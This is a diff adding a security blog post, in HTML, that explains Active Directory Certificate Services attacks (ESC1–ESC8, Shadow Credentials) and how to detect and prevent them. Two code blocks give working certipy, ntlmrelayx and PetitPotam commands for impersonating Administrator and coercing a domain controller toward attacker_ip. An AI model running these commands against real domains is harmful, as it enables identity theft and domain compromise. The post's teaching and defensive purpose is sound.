@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Active Directory Certificate Services — Satej Chaudhari</title>
+  <meta name="description" content="How AD CS works and why it is dangerous — certificate templates, enrolment, PKINIT authentication, and the ESC1-ESC8 misconfiguration classes.">
+
+  <link rel="icon" type="image/svg+xml" href="../assets/img/favicon.svg">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+
+  <header class="site-header">
+    <div class="wrap-wide">
+      <a class="brand" href="../index.html">
+        <span class="brand-mark">SC</span>
+        <span class="brand-name">Satej Chaudhari</span>
+      </a>
+
+      <nav class="site-nav">
+        <a href="../index.html">Home</a>
+        <a href="../writeups.html">Writeups</a>
+        <a href="../blog.html">Blog</a>
+        <a href="../theory.html">Theory</a>
+        <a href="../toolkit.html">Toolkit</a>
+        <a href="https://github.com/satejchaudhari" target="_blank" rel="noopener" class="nav-external">GitHub</a>
+      </nav>
+
+      <button class="nav-toggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <line x1="3" y1="6" x2="21" y2="6"></line>
+          <line x1="3" y1="12" x2="21" y2="12"></line>
+          <line x1="3" y1="18" x2="21" y2="18"></line>
+        </svg>
+      </button>
+    </div>
+  </header>
+
+  <main class="wrap post">
+    <a class="post-back" href="../theory.html">&larr; back to theory</a>
+
+    <article>
+      <header class="post-header">
+        <span class="tag">AD</span>
+
+        <h1 class="post-title">Active Directory Certificate Services</h1>
+
+        <p class="post-meta">
+          <time datetime="2026-08-18">2026-08-18</time>
+          <span>&middot; 11 min read</span>
+        </p>
+      </header>
+
+      <div class="post-body">
+        <p>
+          Active Directory Certificate Services (AD CS) is Microsoft's public-key
+          infrastructure for a Windows domain — it issues the certificates used for smart-card
+          logon, encryption, code signing, and authentication. It is also, since the 2021
+          "Certified Pre-Owned" research, one of the most productive attack surfaces in AD.
+          The reason is simple and severe: a certificate can be used to authenticate via
+          Kerberos, so a misconfiguration that lets you obtain a certificate <em>as someone
+          else</em> is a misconfiguration that lets you become them.
+        </p>
+
+        <h2>The pieces</h2>
+
+        <table>
+          <thead>
+            <tr><th>Component</th><th>Role</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>Certificate Authority (CA)</td><td>The server that issues certificates. An Enterprise CA is integrated with AD and trusted domain-wide</td></tr>
+            <tr><td>Certificate template</td><td>A blueprint defining who can enrol, what the certificate can be used for, and how the subject is determined</td></tr>
+            <tr><td>Enrollment</td><td>The act of requesting a certificate against a template; can be via RPC, the web endpoint, or DCOM</td></tr>
+            <tr><td>EKU (Extended Key Usage)</td><td>What the certificate is allowed to do — the critical one is <em>Client Authentication</em></td></tr>
+            <tr><td>SAN (Subject Alternative Name)</td><td>Who the certificate is <em>for</em>. If you can set this freely, you can be anyone</td></tr>
+          </tbody>
+        </table>
+
+        <h2>Why a certificate equals authentication</h2>
+
+        <p>
+          Kerberos supports <strong>PKINIT</strong> — public-key authentication for the
+          initial AS exchange. Instead of proving you know a password, you prove you hold the
+          private key of a certificate whose subject the KDC trusts. So a certificate with the
+          Client Authentication EKU, issued for a given identity, can be exchanged for a TGT
+          <em>as that identity</em>.
+        </p>
+
+        <blockquote>
+          Two consequences make certificates worse than passwords. First, obtaining a
+          certificate for a user does not require or reveal their password. Second, a
+          certificate's validity is often measured in <em>years</em>, and a certificate is
+          not invalidated by a password reset — so it is persistence that survives the usual
+          remediation. Recovering a machine's or user's certificate is frequently more
+          durable than stealing its hash.
+        </blockquote>
+
+        <h2>The ESC classes</h2>
+
+        <p>
+          The misconfigurations are catalogued as ESC1 through ESC16 (and growing). You do not
+          need to memorise all of them; you need to understand the shape of the common ones,
+          because <a href="../toolkit.html">Certipy</a> finds and exploits them for you. The
+          highest-frequency ones:
+        </p>
+
+        <table>
+          <thead>
+            <tr><th>ESC</th><th>The misconfiguration</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>ESC1</td><td>A template allows the enrollee to <strong>specify the SAN</strong>, has a client-auth EKU, and allows low-priv enrolment. Request a cert "for" Administrator → authenticate as Administrator</td></tr>
+            <tr><td>ESC2</td><td>A template has the <em>Any Purpose</em> EKU (or no EKU restriction), so an issued cert can be used for authentication regardless of intent</td></tr>
+            <tr><td>ESC3</td><td>An Enrollment Agent template lets you request certs <em>on behalf of</em> other users</td></tr>
+            <tr><td>ESC4</td><td>You have <strong>write access to a template object</strong> — reconfigure it into an ESC1 and then abuse it</td></tr>
+            <tr><td>ESC6</td><td>The CA has the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag set, letting <em>any</em> request specify a SAN regardless of the template</td></tr>
+            <tr><td>ESC7</td><td>You have dangerous rights <em>over the CA itself</em> (ManageCA / ManageCertificates)</td></tr>
+            <tr><td>ESC8</td><td>The CA's <strong>web enrolment endpoint</strong> accepts NTLM without EPA — relay a coerced machine account to it and get a cert for that machine</td></tr>
+          </tbody>
+        </table>
+
+        <h2>ESC1 — the canonical example</h2>
+
+        <p>
+          ESC1 is worth walking through because it captures the whole idea. The template
+          allows a normal user to enrol, its EKU permits client authentication, and — the
+          fatal flag — <code>ENROLLEE_SUPPLIES_SUBJECT</code> lets the requester name the
+          subject. So you request a certificate and simply say the subject is
+          <code>administrator@corp.local</code>. The CA issues it. You then use it for PKINIT
+          and receive Administrator's TGT.
+        </p>
+
+        <pre><code># find vulnerable templates
+certipy find -u jdoe@corp.local -p Passw0rd -dc-ip 10.10.10.10 -vulnerable
+
+# ESC1: request a cert as Administrator
+certipy req -u jdoe@corp.local -p Passw0rd -ca CORP-CA \
+  -template VulnTemplate -upn administrator@corp.local
+
+# authenticate with it → TGT + NT hash
+certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10</code></pre>
+
+        <h2>ESC8 — the relay path</h2>
+
+        <p>
+          ESC8 is the one that connects to <a href="2026-08-18-coercion-ntlm-relay.html">coercion
+          and relay</a>. The CA's web enrolment page (<code>/certsrv</code>) accepts NTLM
+          authentication, and if Extended Protection for Authentication is not enforced, that
+          NTLM can be relayed. Coerce a domain controller to authenticate, relay it to the CA
+          web endpoint, request a certificate for the DC, and turn that into the DC's TGT —
+          domain compromise from a coercion primitive and a missing EPA setting.
+        </p>
+
+        <pre><code>ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support \
+  --adcs --template DomainController
+PetitPotam.py -u user -p pass attacker_ip dc01_ip
+certipy auth -pfx dc01.pfx</code></pre>
+
+        <h2>Shadow Credentials — the AD CS-adjacent attack</h2>
+
+        <p>
+          Even without a vulnerable template, AD CS's PKINIT support enables the
+          <strong>Shadow Credentials</strong> attack. If you can write the
+          <code>msDS-KeyCredentialLink</code> attribute of an account (an
+          <a href="2026-08-18-acls-dacls.html">ACL</a> right), you add your own key pair to it
+          and authenticate as that account via PKINIT — recovering its NT hash without touching
+          its password. <a href="../toolkit.html">pyWhisker</a> writes the attribute; Certipy
+          does the PKINIT.
+        </p>
+
+        <h2>Detection and defence</h2>
+
+        <table>
+          <thead>
+            <tr><th>Control</th><th>Effect</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>Audit templates with Certipy/PSPKIAudit</td><td>Find the ESC conditions before an attacker does — this is the primary defence</td></tr>
+            <tr><td>Remove ENROLLEE_SUPPLIES_SUBJECT</td><td>Kills ESC1 where the SAN does not genuinely need to be enrollee-supplied</td></tr>
+            <tr><td>Enforce EPA on the CA web endpoint</td><td>Closes ESC8</td></tr>
+            <tr><td>Restrict enrolment and manager rights</td><td>Least privilege on templates and the CA itself addresses ESC4 and ESC7</td></tr>
+            <tr><td>Enable CA request logging / monitor issuance</td><td>A certificate issued for a privileged SAN to a low-priv requester is a strong signal</td></tr>
+            <tr><td>Require manager approval on sensitive templates</td><td>Adds a human gate that breaks automated abuse</td></tr>
+          </tbody>
+        </table>
+
+        <h2>The takeaway</h2>
+
+        <p>
+          AD CS is dangerous because it mints authentication. A certificate is a
+          password-independent, long-lived, reset-surviving credential, and PKINIT turns it
+          straight into a Kerberos TGT. The ESC classes are all variations on one theme —
+          get the CA to issue you a certificate for an identity you should not control —
+          whether by supplying your own subject (ESC1/6), rewriting a template (ESC4),
+          abusing the CA (ESC7), or relaying to the web endpoint (ESC8). Certipy is the tool
+          that both finds and exploits them; run it early, because when AD CS is misconfigured
+          it is often the shortest path to Domain Admin. See
+          <a href="2026-08-18-kerberos.html">Kerberos</a> for PKINIT and
+          <a href="2026-08-18-coercion-ntlm-relay.html">Coercion &amp; NTLM Relay</a> for the
+          ESC8 chain.
+        </p>
+      </div>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+    <div class="wrap-wide">
+      <p>&copy; 2026 Satej Chaudhari</p>
+      <div class="footer-links">
+        <a href="../writeups.html">Writeups</a>
+        <a href="../blog.html">Blog</a>
+        <a href="../theory.html">Theory</a>
+        <a href="../toolkit.html">Toolkit</a>
+      </div>
+    </div>
+  </footer>
+
+  <script src="../assets/js/main.js"></script>
+</body>
+</html>
